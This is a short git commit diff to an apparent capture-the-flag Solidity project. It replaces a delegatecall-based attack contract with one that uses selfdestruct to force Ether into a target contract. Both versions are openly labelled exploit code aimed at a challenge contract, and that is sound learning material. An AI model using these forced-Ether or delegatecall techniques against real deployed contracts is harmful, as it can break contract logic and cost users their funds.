0c8387b58c8ee427dfc3b58c431de0d5f5470367
lebedev666e <lebedev666e@gmail.com>
2022-08-31 20:18:32 +0300

    selfdestruct attack

--- contracts/Attack.sol
+++ contracts/Attack.sol
@@ -1,18 +1,10 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import 'hardhat/console.sol';
 import '@openzeppelin/contracts/access/Ownable.sol';
-import './Challenge.sol';
 
-contract Attack {
-    bool public flag;
-
-    function hack(address challenge) public {
-        (bool success, bytes memory result) = challenge.delegatecall(abi.encodeWithSignature("setFlag()"));
-        console.log(string(result));
-        if (!success) {
-            revert("gg");
-        }
+contract Attack is Ownable {
+    function hack(address contractCtf) external payable onlyOwner {
+        selfdestruct(payable(contractCtf));
     }
 }
